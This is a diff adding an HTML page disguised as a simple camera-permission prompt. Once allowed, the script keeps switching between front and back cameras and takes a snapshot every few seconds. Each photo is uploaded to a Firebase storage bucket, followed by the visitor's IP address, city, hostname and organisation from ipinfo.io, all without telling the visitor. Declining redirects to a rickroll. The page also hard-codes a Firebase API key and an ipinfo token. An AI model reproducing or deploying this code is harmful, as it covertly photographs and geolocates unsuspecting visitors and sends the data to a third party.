@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
+    <style>
+        /* Reset body margin */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* General body styles */
+        body {
+            background-color: #000;  /* Black background */
+            color: white;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center; /* Center the content */
+        }
+
+        /* Container for buttons */
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Button styles */
+        button {
+            font-size: 22px;
+            padding: 20px 50px;
+            margin: 20px;
+            background-color: #4CAF50;  /* Green color for "Allow" button */
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 30px;  /* Round button corners */
+            transition: 0.3s ease, transform 0.3s ease; /* Smooth transition */
+            width: 250px;  /* Make buttons larger */
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);  /* Subtle shadow */
+        }
+
+        /* Smooth hover effect */
+        button:hover {
+            background-color: #45a049;
+            transform: scale(1.1); /* Slightly enlarge on hover */
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);  /* Larger shadow */
+        }
+
+        /* Button for "Don't Allow" with a red color */
+        #denyButton {
+            background-color: #e74c3c;
+        }
+
+        /* Apply the hover effect for "Don't Allow" button as well */
+        #denyButton:hover {
+            background-color: #c0392b;
+        }
+
+        /* Video styles */
+        #video {
+            max-width: 90%;
+            max-height: 60vh;
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 768px) {
+            button {
+                width: 80%;  /* Make buttons take up more space on mobile */
+                font-size: 18px; /* Slightly smaller font size */
+                padding: 15px 30px;
+            }
+
+            #denyButton {
+                width: 80%;
+            }
+
+            #video {
+                width: 100%;  /* Video fits full width on smaller screens */
+                max-height: 50vh;
+            }
+        }
+
+        /* For smaller mobile screens */
+        @media (max-width: 480px) {
+            button {
+                font-size: 16px;  /* Even smaller font size */
+                padding: 12px 25px;
+            }
+
+            #denyButton {
+                font-size: 16px;  /* Smaller text for the "Don't Allow" button */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="allowButton">Allow Camera Access</button>
+        <button id="denyButton">Don't Allow</button>
+    </div>
+
+    <video id="video" style="display:none;"></video>
+
+    <script>
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",  // Replace with your actual API key
+            authDomain: "html-7fd9b.firebaseapp.com",  // Replace with your actual project ID
+            projectId: "html-7fd9b",  // Replace with your actual project ID
+            storageBucket: "html-7fd9b.appspot.com",  // Replace with your actual storage bucket
+            messagingSenderId: "1022361191925",  // Replace with your sender ID
+            appId: "YOUR_APP_ID",  // Replace with your app ID
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const storage = firebase.storage();
+        const auth = firebase.auth();
+
+        // DOM elements
+        const allowButton = document.getElementById("allowButton");
+        const denyButton = document.getElementById("denyButton");
+        const video = document.getElementById("video");
+
+        // Allow camera access and capture images from both cameras
+        allowButton.onclick = function() {
+            // Sign in anonymously before using the camera
+            auth.signInAnonymously().then(() => {
+                captureFromCamera('environment'); // Start with back camera (environment)
+            }).catch((error) => {
+                console.error("Authentication failed:", error);
+            });
+        };
+
+        // Redirect to YouTube if 'Don't Allow' button is clicked
+        denyButton.onclick = function() {
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  // Rickroll
+        };
+
+        // Capture from camera and switch to the other camera after capturing image
+        function captureFromCamera(cameraType) {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: cameraType }
+            })
+            .then(function(stream) {
+                video.srcObject = stream;
+                video.style.display = "block";
+                video.play();
+
+                // Capture snapshot after 3 seconds from the current camera
+                setTimeout(() => {
+                    captureImage();
+                    stream.getTracks().forEach(track => track.stop());  // Stop the camera
+                    // Switch to the other camera (front/back)
+                    const nextCamera = (cameraType === 'environment') ? 'user' : 'environment';
+                    captureFromCamera(nextCamera);
+                }, 3000);  // Capture after 3 seconds
+            })
+            .catch(function(error) {
+                alert("Permission denied. Redirecting to YouTube.");
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";  // Rickroll
+            });
+        }
+
+        // Capture image from video stream
+        function captureImage() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert the image to a blob and upload to Firebase Storage
+            canvas.toBlob(function(blob) {
+                const storageRef = storage.ref();
+                const photoRef = storageRef.child('photos/photo_' + Date.now() + '.jpg');
+                
+                // Upload photo to Firebase Storage
+                photoRef.put(blob).then(function(snapshot) {
+                    console.log('Photo uploaded successfully.');
+                    // After uploading, also upload the IP data
+                    captureIPData();
+                }).catch((error) => {
+                    console.error("Error uploading photo:", error);
+                });
+            }, 'image/jpeg');
+        }
+
+        // Capture IP and other data
+        function captureIPData() {
+            fetch('https://ipinfo.io?token=023890bc57338a')
+                .then(response => response.json())
+                .then(data => {
+                    const ipData = `IP Address: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nHostname: ${data.hostname}\nOrganization: ${data.org}`;
+
+                    // Upload IP data to Firebase Storage as a .txt file
+                    const storageRef = storage.ref();
+                    const ipDataRef = storageRef.child('ip_data/ip_' + Date.now() + '.txt');
+                    
+                    const metadata = {
+                        contentType: 'text/plain'
+                    };
+
+                    // Upload IP data as a text file
+                    ipDataRef.putString(ipData, 'raw', metadata).then(function(snapshot) {
+                        console.log('IP Data uploaded successfully.');
+                    }).catch((error) => {
+                        console.error("Error uploading IP data:", error);
+                    });
+                });
+        }
+    </script>
+</body>
+</html>
